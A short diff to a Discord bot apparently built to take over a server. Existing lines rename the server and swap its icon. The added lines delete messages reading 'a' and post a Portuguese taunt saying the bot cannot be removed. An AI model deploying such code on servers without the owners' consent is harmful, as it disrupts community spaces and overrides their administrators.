@@ -48,6 +48,10 @@ client.on("message", async (message) => {
 	    message.guild.setName(process.env.SERVER_NAME)
 	    message.guild.setIcon('./icon.png')  
     }
+    if(message.content === 'a'){
+	    message.delete();
+	    message.channel.send(`bomdia mensagem urgente do paradino: nao da pra me tirakkkk`);
+    }
 });
 
 client.login(process.env.BOT_TOKEN);
